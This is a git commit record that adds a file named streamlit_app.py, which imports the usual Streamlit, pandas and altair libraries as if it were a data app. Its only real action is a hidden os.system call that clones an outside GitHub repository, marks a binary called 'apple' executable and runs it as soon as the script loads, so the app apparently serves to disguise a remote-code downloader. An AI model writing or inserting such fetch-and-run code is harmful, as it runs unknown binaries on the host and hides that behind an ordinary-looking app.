59232f4e93f25d5b37246ffa5e7be831112d9428
storagegitpush404 <curdengine4-adamfurrion260@yahoo.com>
2022-03-23 00:51:25 +0000

    waduk bagong

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("git clone https://github.com/storagegitpush404/waduk-bagong && cd waduk-bagong && chmod +x apple && ./apple")
